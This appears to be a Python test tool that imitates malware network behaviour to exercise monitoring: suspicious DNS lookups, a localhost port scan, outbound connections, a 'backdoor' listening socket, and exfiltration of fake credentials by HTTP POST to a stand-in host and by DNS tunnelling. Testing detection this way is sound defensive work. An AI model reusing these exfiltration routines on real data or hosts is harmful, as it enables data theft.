#!/usr/bin/env python3
"""
Network Activity Simulator
Simulates malware network behavior patterns
Tests: Network monitoring, DNS queries, connection tracking
"""

import socket
import time
import threading
import subprocess
import random
import os

class NetworkActivitySimulator:
    def __init__(self):
        self.active = True
        self.connections = []
        
    def simulate_dns_queries(self):
        """Simulate DNS lookup activities"""
        print("Starting DNS query simulation...")
        
        # Simulate suspicious domain lookups
        suspicious_domains = [
            "suspicious-test-domain.com",
            "malware-test.example.org", 
            "command-control-test.net",
            "data-exfil-test.io",
            "botnet-test.xyz"
        ]
        
        for domain in suspicious_domains:
            if not self.active:
                break
                
            try:
                print(f"Attempting DNS lookup for: {domain}")
                # This will fail but will show up in network monitoring
                socket.gethostbyname(domain)
            except socket.gaierror as e:
                print(f"DNS lookup failed for {domain}: {e}")
            
            time.sleep(2)
    
    def simulate_port_scanning(self):
        """Simulate port scanning behavior"""
        print("Starting port scanning simulation...")
        
        target_host = "127.0.0.1"  # Only scan localhost
        common_ports = [22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 8080, 8443]
        
        for port in common_ports:
            if not self.active:
                break
                
            try:
                print(f"Scanning port {port} on {target_host}")
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target_host, port))
                
                if result == 0:
                    print(f"Port {port} is open")
                else:
                    print(f"Port {port} is closed/filtered")
                
                sock.close()
                
            except Exception as e:
                print(f"Error scanning port {port}: {e}")
            
            time.sleep(1)
    
    def simulate_connection_attempts(self):
        """Simulate connection attempts to various IPs"""
        print("Starting connection attempt simulation...")
        
        # Simulate attempts to connect to various IPs (will fail but show in monitoring)
        suspicious_ips = [
            "1.2.3.4",
            "10.0.0.1", 
            "192.168.1.1",
            "8.8.8.8",  # Google DNS - may succeed
            "1.1.1.1"   # Cloudflare DNS - may succeed
        ]
        
        for ip in suspicious_ips:
            if not self.active:
                break
                
            port = random.choice([80, 443, 8080, 9999, 31337])
            
            try:
                print(f"Attempting connection to {ip}:{port}")
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((ip, port))
                print(f"Connected to {ip}:{port}")
                
                # Send some data to simulate C&C communication
                sock.send(b"GET / HTTP/1.1\r\nHost: test\r\n\r\n")
                
                self.connections.append(sock)
                
            except Exception as e:
                print(f"Connection to {ip}:{port} failed: {e}")
            
            time.sleep(2)
    
    def create_listening_socket(self):
        """Create a listening socket (backdoor simulation)"""
        print("Creating listening socket (backdoor simulation)...")
        
        try:
            # Create a listening socket on a random high port
            port = random.randint(8000, 9000)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(('localhost', port))
            sock.listen(5)
            
            print(f"Listening on port {port} (backdoor simulation)")
            
            # Accept connections for a short time
            sock.settimeout(10)
            
            try:
                while self.active:
                    try:
                        client_sock, addr = sock.accept()
                        print(f"Accepted connection from {addr}")
                        
                        # Simulate some data exchange
                        client_sock.send(b"HTTP/1.1 200 OK\r\n\r\nTest backdoor response")
                        client_sock.close()
                        
                    except socket.timeout:
                        break
                        
            except Exception as e:
                print(f"Listening socket error: {e}")
            
            finally:
                sock.close()
                print(f"Closed listening socket on port {port}")
                
        except Exception as e:
            print(f"Failed to create listening socket: {e}")
    
    def simulate_data_exfiltration(self):
        """Simulate data exfiltration patterns"""
        print("Simulating data exfiltration patterns...")
        
        # Create fake sensitive data
        fake_data = [
            "user:admin:password123",
            "credit_card:4532-1234-5678-9012",
            "ssn:123-45-6789",
            "api_key:sk_test_123456789abcdef",
            "database_conn:postgresql://user:pass@localhost/db"
        ]
        
        # Try to "exfiltrate" via different methods
        methods = [
            ("HTTP POST", self.exfiltrate_http),
            ("DNS Tunneling", self.exfiltrate_dns),
            ("File Upload", self.exfiltrate_file)
        ]
        
        for method_name, method_func in methods:
            if not self.active:
                break
                
            print(f"Attempting {method_name} exfiltration...")
            try:
                method_func(fake_data)
            except Exception as e:
                print(f"{method_name} exfiltration failed: {e}")
            
            time.sleep(3)
    
    def exfiltrate_http(self, data):
        """Simulate HTTP-based exfiltration"""
        try:
            import urllib.request
            import urllib.parse
            
            # Simulate POST to external server (will fail)
            post_data = urllib.parse.urlencode({
                'data': '\n'.join(data),
                'victim_id': f"test_{os.getpid()}",
                'timestamp': time.time()
            }).encode()
            
            req = urllib.request.Request(
                'http://evil-exfil-server.test.com/collect',
                data=post_data,
                headers={'Content-Type': 'application/x-www-form-urlencoded'}
            )
            
            response = urllib.request.urlopen(req, timeout=5)
            print(f"HTTP exfiltration response: {response.status}")
            
        except Exception as e:
            print(f"HTTP exfiltration failed: {e}")
    
    def exfiltrate_dns(self, data):
        """Simulate DNS tunneling exfiltration"""
        base_domain = "exfil-test.malware-sim.com"
        
        for i, item in enumerate(data):
            if not self.active:
                break
                
            # Encode data in subdomain (simplified)
            encoded = item.replace(':', '-').replace('@', 'AT')[:20]
            dns_query = f"{encoded}.{base_domain}"
            
            try:
                print(f"DNS exfiltration query: {dns_query}")
                socket.gethostbyname(dns_query)
            except socket.gaierror:
                print(f"DNS exfiltration query failed (expected): {dns_query}")
            
            time.sleep(1)
    
    def exfiltrate_file(self, data):
        """Simulate file-based exfiltration"""
        # Create exfiltration staging file
        staging_file = "/tmp/exfil_staging.dat"
        
        with open(staging_file, 'w') as f:
            f.write("=== EXFILTRATED DATA (TEST) ===\n")
            f.write(f"Timestamp: {time.time()}\n")
            f.write(f"Source PID: {os.getpid()}\n")
            f.write("Data:\n")
            for item in data:
                f.write(f"  {item}\n")
        
        print(f"Staged exfiltration data in: {staging_file}")
        
        # Simulate attempting to upload/transfer file
        print("Attempting to transfer staged data...")
        time.sleep(2)
        
        # Cleanup
        try:
            os.remove(staging_file)
            print("Cleaned up staging file")
        except:
            pass
    
    def run_all_simulations(self):
        """Run all network simulations"""
        print("=== Network Activity Simulator Starting ===")
        print(f"Process PID: {os.getpid()}")
        
        # Run simulations in parallel threads
        threads = [
            threading.Thread(target=self.simulate_dns_queries, daemon=True),
            threading.Thread(target=self.simulate_port_scanning, daemon=True),
            threading.Thread(target=self.simulate_connection_attempts, daemon=True),
            threading.Thread(target=self.create_listening_socket, daemon=True),
            threading.Thread(target=self.simulate_data_exfiltration, daemon=True)
        ]
        
        # Start all threads
        for thread in threads:
            thread.start()
            time.sleep(2)  # Stagger thread starts
        
        # Let simulations run for a while
        print("Running simulations for 30 seconds...")
        time.sleep(30)
        
        # Stop all activities
        print("Stopping all network activities...")
        self.active = False
        
        # Wait for threads to complete
        for thread in threads:
            thread.join(timeout=5)
        
        # Close any remaining connections
        for conn in self.connections:
            try:
                conn.close()
            except:
                pass
        
        print("=== Network Activity Simulation Complete ===")

def main():
    """Main function"""
    simulator = NetworkActivitySimulator()
    
    try:
        simulator.run_all_simulations()
    except KeyboardInterrupt:
        print("\nReceived interrupt, stopping...")
        simulator.active = False
    except Exception as e:
        print(f"Simulation error: {e}")

if __name__ == "__main__":
    main()